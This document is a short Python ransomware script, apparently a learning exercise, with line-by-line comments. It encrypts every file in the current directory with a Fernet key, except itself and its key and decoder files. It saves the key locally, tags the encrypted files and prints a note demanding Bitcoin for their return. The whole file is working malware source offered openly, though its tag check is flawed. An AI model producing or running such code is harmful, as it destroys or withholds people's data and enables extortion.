import os

#allows us to use regular expressions to specify a single/group of chars in a string
import re

#necessary for encryption/decryption
from cryptography.fernet import Fernet

#a variable that will store file names of the victim's files
victims_files = []

#a for loop that will list each file in the victim's directory
for file in os.listdir():

        #an exception so that the encryption/decryption does not affect the specified files
        if file == "ransomware.py" or file == "thekey.key" or file == "decode.py":
                continue

        #verify that a file is indeed a file and not a directory such as folders or directories.
        if os.path.isfile(file):
                victims_files.append(file)

#print the list of victim's files
#print(victims_files)

#generate crypto key using Fernet
key = Fernet.generate_key()

#a tag that will be added to encrypted files in order to avoid encrypting already encrypted files
tag = " hello".encode()

#a for loop using regular expression to verify if each file contains the tag variable
for file in victims_files:
        with open(file, "r") as thefile:
                notbin_content = thefile.read()
                regex = r" hello$"
                contains_tag = bool(re.search(regex, notbin_content))

#before overwriting the existing key, make sure the victim's files are not yet encrypted
if contains_tag == False:
        #write/create the key ("wb" - write in binary) in a file called thekey.key
        with open("thekey.key", "wb") as thekey:
                thekey.write(key)
                
        #inform victim their files got encrypted
        print("Your files have been encrypted. If you wan't to get a chance of getting them back, send 1 million Bitcoin to this account: realAccount@pleasePay")

#a for loop to examine and modify each file in the directory
for file in victims_files:

        #open each file and store its info inside the variable contents
        with open(file, "rb") as thefile:
                contents = thefile.read()
                
        #use the key to encrypt contents
        encrypt_contents = Fernet(key).encrypt(contents)
        
        
        #if the file was already encrypted with the tag, do not encrypt. 
        if contains_tag:
                print("\"" + file + "\" has already been encrypted.")
                
        #if the file has not yet been encrypted with the tag, then encrypt
        else:
                #overwrite the contents of each file using the encrypted version
                with open(file, "wb") as thefile:
                        thefile.write(encrypt_contents + tag)
                
